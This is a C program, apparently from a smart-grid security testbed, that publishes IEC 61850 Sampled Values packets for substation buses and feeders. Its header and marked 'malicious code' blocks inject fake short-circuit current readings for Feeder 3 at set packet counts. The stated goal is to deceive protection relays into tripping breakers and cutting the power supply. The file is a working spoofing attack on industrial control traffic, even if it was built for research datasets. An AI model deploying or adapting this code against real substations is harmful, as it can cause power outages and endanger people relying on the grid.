/*
 * SV2_PUB_9442c
 
#####################################################################################################################################################

Malicious behaviour:

Network level: the malicious program will modify **two** original SV packets with fake measurements to spoof an emergency (short-circuit) situation around Feeders. The malicious program starts from approximately the 15th second, the 60th second, and the 105th second, respectively.

Physical process level: Under fault-free operation, circuit breakers protecting the Feeders are ALWAYS decived into tripping (attacks ALWAYS impact the physical process), while the power supply is ALWAYS interrupted.

#####################################################################################################################################################
*/

#include <signal.h>
#include <stdio.h>
#include "hal_thread.h"
#include "sv_publisher.h"

static bool running = true;

void sigint_handler(int signalId)
{
    running = 0;
}

int
main(int argc, char** argv)
{
    char* interface;
    int Current_values [26] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
  
    if (argc > 1)
        interface = argv[1];
    else
        interface = "enp0s8";
  
    printf("Using interface %s\n", interface);

    signal(SIGINT, sigint_handler);
    
    CommParameters svCommParameters;

	svCommParameters.appId = 0x4002;
	svCommParameters.dstAddress[0] = 0x01;
	svCommParameters.dstAddress[1] = 0x0c;
	svCommParameters.dstAddress[2] = 0xcd;
	svCommParameters.dstAddress[3] = 0x04;
	svCommParameters.dstAddress[4] = 0x00;
	svCommParameters.dstAddress[5] = 0x01;
	svCommParameters.vlanId = 0;
	svCommParameters.vlanPriority = 4;

    SVPublisher svPublisher = SVPublisher_create(&svCommParameters, interface);

    if (svPublisher) {
        	
    	uint16_t smpSynch = 0; /* range from 1 to 255, usually 0 (not syn), 1 (syn local), 2 (syn remote) */
    	/*optional fields settings*/
    	//uint8_t smpMod = 0; /* 0 = samples per nominal period (DEFAULT), 1 = samples per second, 2 = seconds per sample */
    	//uint16_t smpRate = 80;	
	
//------------------------------------------------------------------------------------------------------------------------------//    	
    	//ASDU1 for 22kV1//
        SVPublisher_ASDU asdu1 = SVPublisher_addASDU(svPublisher, "22kV1", NULL, 1);

        int int1_asdu1 = SVPublisher_ASDU_addINT32(asdu1);
        int ts_asdu1 = SVPublisher_ASDU_addTimestamp(asdu1);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu1, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu1, smpRate);
        */
        
//------------------------------------------------------------------------------------------------------------------------------//
        //ASDU2 for 22kV2//
        SVPublisher_ASDU asdu2 = SVPublisher_addASDU(svPublisher, "22kV2", NULL, 1);

        int int1_asdu2 = SVPublisher_ASDU_addINT32(asdu2);
        int ts_asdu2 = SVPublisher_ASDU_addTimestamp(asdu2);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu2, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu2, smpRate);
        */
        
//------------------------------------------------------------------------------------------------------------------------------//
    	//ASDU3 for 22kV3//
        SVPublisher_ASDU asdu3 = SVPublisher_addASDU(svPublisher, "22kV3", NULL, 1);

        int int1_asdu3 = SVPublisher_ASDU_addINT32(asdu3);
        int ts_asdu3 = SVPublisher_ASDU_addTimestamp(asdu3);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu3, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu3, smpRate);
        */
        
//------------------------------------------------------------------------------------------------------------------------------//
        //ASDU4 for FDR1//
        SVPublisher_ASDU asdu4 = SVPublisher_addASDU(svPublisher, "FDR1", NULL, 1);

        int int1_asdu4 = SVPublisher_ASDU_addINT32(asdu4);
        int ts_asdu4 = SVPublisher_ASDU_addTimestamp(asdu4);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu4, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu4, smpRate);
        */    
        
//------------------------------------------------------------------------------------------------------------------------------//
        //ASDU4 for FDR2//
        SVPublisher_ASDU asdu5 = SVPublisher_addASDU(svPublisher, "FDR2", NULL, 1);

        int int1_asdu5 = SVPublisher_ASDU_addINT32(asdu5);
        int ts_asdu5 = SVPublisher_ASDU_addTimestamp(asdu5);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu5, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu5, smpRate);
        */    
        
//------------------------------------------------------------------------------------------------------------------------------//
        //ASDU4 for FDR3//
        SVPublisher_ASDU asdu6 = SVPublisher_addASDU(svPublisher, "FDR3", NULL, 1);

        int int1_asdu6 = SVPublisher_ASDU_addINT32(asdu6);
        int ts_asdu6 = SVPublisher_ASDU_addTimestamp(asdu6);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu6, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu6, smpRate);
        */    
        
//------------------------------------------------------------------------------------------------------------------------------//
        //ASDU4 for FDR4//
        SVPublisher_ASDU asdu7 = SVPublisher_addASDU(svPublisher, "FDR4", NULL, 1);

        int int1_asdu7 = SVPublisher_ASDU_addINT32(asdu7);
        int ts_asdu7 = SVPublisher_ASDU_addTimestamp(asdu7);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu7, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu7, smpRate);
        */    
        
//------------------------------------------------------------------------------------------------------------------------------//
        //ASDU_f1 for F_22kV1//
        SVPublisher_ASDU asdu_f1 = SVPublisher_addASDU(svPublisher, "F_22kV1", NULL, 1);

        int int1_asdu_f1 = SVPublisher_ASDU_addINT32(asdu_f1);
        int ts_asdu_f1 = SVPublisher_ASDU_addTimestamp(asdu_f1);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu_f1, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu_f1, smpRate);
        */   
        
//------------------------------------------------------------------------------------------------------------------------------//
    	//ASDU_f2 for F_22kV2//
        SVPublisher_ASDU asdu_f2 = SVPublisher_addASDU(svPublisher, "F_22kV2", NULL, 1);

        int int1_asdu_f2 = SVPublisher_ASDU_addINT32(asdu_f2);
        int ts_asdu_f2 = SVPublisher_ASDU_addTimestamp(asdu_f2);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu_f2, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu_f2, smpRate);
        */

//------------------------------------------------------------------------------------------------------------------------------//
    	//ASDU_f3 for F_FDR1//
        SVPublisher_ASDU asdu_f3 = SVPublisher_addASDU(svPublisher, "F_FDR1", NULL, 1);

        int int1_asdu_f3 = SVPublisher_ASDU_addINT32(asdu_f3);
        int ts_asdu_f3 = SVPublisher_ASDU_addTimestamp(asdu_f3);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu_f3, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu_f3, smpRate);
        */

//------------------------------------------------------------------------------------------------------------------------------//
    	//ASDU_f4 for F_FDR2//
        SVPublisher_ASDU asdu_f4 = SVPublisher_addASDU(svPublisher, "F_FDR2", NULL, 1);

        int int1_asdu_f4 = SVPublisher_ASDU_addINT32(asdu_f4);
        int ts_asdu_f4 = SVPublisher_ASDU_addTimestamp(asdu_f4);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu_f4, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu_f4, smpRate);
        */

//------------------------------------------------------------------------------------------------------------------------------//
    	//ASDU_f5 for F_FDR3//
        SVPublisher_ASDU asdu_f5 = SVPublisher_addASDU(svPublisher, "F_FDR3", NULL, 1);

        int int1_asdu_f5 = SVPublisher_ASDU_addINT32(asdu_f5);
        int ts_asdu_f5 = SVPublisher_ASDU_addTimestamp(asdu_f5);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu_f5, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu_f5, smpRate);
        */

//------------------------------------------------------------------------------------------------------------------------------//
    	//ASDU_f6 for F_FDR4//
        SVPublisher_ASDU asdu_f6 = SVPublisher_addASDU(svPublisher, "F_FDR4", NULL, 1);

        int int1_asdu_f6 = SVPublisher_ASDU_addINT32(asdu_f6);
        int ts_asdu_f6 = SVPublisher_ASDU_addTimestamp(asdu_f6);
        /*optional fields
        SVPublisher_ASDU_setSmpMod(asdu_f6, smpMod);
        SVPublisher_ASDU_setSmpRate(asdu_f6, smpRate);
        */

//------------------------------------------------------------------------------------------------------------------------------//
        
        SVPublisher_setupComplete(svPublisher);

//########################################################Malicious codes begin#############################################################################################//	 	 
		int j = 0;
		int trigger[3] = {300, 1200, 2100}; // three triggers at the 300th, 1200th, 2100th SV packets (the 15th, 60th, 105th second regarding 50ms HB)
		int num_mal = 2; // number of the malicious packets
	
//########################################################Malicious codes end#############################################################################################//

        while (running) {
            Timestamp ts;
            Timestamp_clearFlags(&ts);
            Timestamp_setTimeInMilliseconds(&ts, Hal_getTimeInMs());
            FILE *fp;
            
	    	int i;
            //Open File//
            fp=fopen("/home/ray/Desktop/Primary Plant/TripRecord/CurrentValues.csv","r");
            if(fp==NULL) {
	    		printf("File cannot open! " );
	    		exit(0);
	   		}
	    	//Read values from file//
	    	for (i=0; i<26; i++) {
	    		fscanf(fp,"%d,", &Current_values[i]);
	    		//Debug//
	    		//printf("%d\t",Current_values[i]);
	    	}    
	    	//Close file//
	    	fclose(fp);
	    
			//Allocate physical values//
			int I_22kV1 =   Current_values[9];
			int I_22kV2 =   Current_values[10];
			int I_22kV3 =   Current_values[11];
			int I_FDR1 =    Current_values[12];
			int I_FDR2 =    Current_values[13];
			int I_FDR3 =    Current_values[14];
			int I_FDR4 =    Current_values[15];
			int I_F_22kV1 = Current_values[20];
			int I_F_22kV2 = Current_values[21];
			int I_F_FDR1 =  Current_values[22];
			int I_F_FDR2 =  Current_values[23];
			int I_F_FDR3 =  Current_values[24];
			int I_F_FDR4 =  Current_values[25];

//########################################################Malicious codes begin#############################################################################################//
	    	j++;
	        
	        if (  ( (j > trigger[0] ) && (j <= trigger[0] + num_mal) ) || ( (j > trigger[1] ) && (j <= trigger[1] + num_mal) ) || ( (j > trigger[2] ) && (j <= trigger[2] + num_mal) )  ){   
				I_FDR3 = 2017;
				I_F_FDR3 = 2017;
			}
		
//########################################################Malicious codes end#############################################################################################//
	        //Assign values to different ASDUs//
            SVPublisher_ASDU_setINT32(asdu1, int1_asdu1, I_22kV1);
            SVPublisher_ASDU_setTimestamp(asdu1, ts_asdu1, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu1);
            SVPublisher_ASDU_setSmpSynch(asdu1, smpSynch);           

            SVPublisher_ASDU_setINT32(asdu2, int1_asdu2, I_22kV2);
            SVPublisher_ASDU_setTimestamp(asdu2, ts_asdu2, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu2);
            SVPublisher_ASDU_setSmpSynch(asdu2, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu3, int1_asdu3, I_22kV3);
            SVPublisher_ASDU_setTimestamp(asdu3, ts_asdu3, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu3);
            SVPublisher_ASDU_setSmpSynch(asdu3, smpSynch);
        
            SVPublisher_ASDU_setINT32(asdu4, int1_asdu4, I_FDR1);
            SVPublisher_ASDU_setTimestamp(asdu4, ts_asdu4, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu4);
            SVPublisher_ASDU_setSmpSynch(asdu4, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu5, int1_asdu5, I_FDR2);
            SVPublisher_ASDU_setTimestamp(asdu5, ts_asdu5, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu5);
            SVPublisher_ASDU_setSmpSynch(asdu5, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu6, int1_asdu6, I_FDR3);
            SVPublisher_ASDU_setTimestamp(asdu6, ts_asdu6, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu6);
            SVPublisher_ASDU_setSmpSynch(asdu6, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu7, int1_asdu7, I_FDR4);
            SVPublisher_ASDU_setTimestamp(asdu7, ts_asdu7, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu7);
            SVPublisher_ASDU_setSmpSynch(asdu7, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu_f1, int1_asdu_f1, I_F_22kV1);
            SVPublisher_ASDU_setTimestamp(asdu_f1, ts_asdu_f1, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu_f1);
            SVPublisher_ASDU_setSmpSynch(asdu_f1, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu_f2, int1_asdu_f2, I_F_22kV2);
            SVPublisher_ASDU_setTimestamp(asdu_f2, ts_asdu_f2, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu_f2);
            SVPublisher_ASDU_setSmpSynch(asdu_f2, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu_f3, int1_asdu_f3, I_F_FDR1);
            SVPublisher_ASDU_setTimestamp(asdu_f3, ts_asdu_f3, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu_f3);
            SVPublisher_ASDU_setSmpSynch(asdu_f3, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu_f4, int1_asdu_f4, I_F_FDR2);
            SVPublisher_ASDU_setTimestamp(asdu_f4, ts_asdu_f4, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu_f4);
            SVPublisher_ASDU_setSmpSynch(asdu_f4, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu_f5, int1_asdu_f5, I_F_FDR3);
            SVPublisher_ASDU_setTimestamp(asdu_f5, ts_asdu_f5, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu_f5);
            SVPublisher_ASDU_setSmpSynch(asdu_f5, smpSynch);
            
            SVPublisher_ASDU_setINT32(asdu_f6, int1_asdu_f6, I_F_FDR4);
            SVPublisher_ASDU_setTimestamp(asdu_f6, ts_asdu_f6, ts);
            SVPublisher_ASDU_increaseSmpCnt(asdu_f6);
            SVPublisher_ASDU_setSmpSynch(asdu_f6, smpSynch);
            
            SVPublisher_publish(svPublisher);

            Thread_sleep(50);
        }

        SVPublisher_destroy(svPublisher);
	}

    else {
        printf("Failed to create SV publisher\n");
    }
}
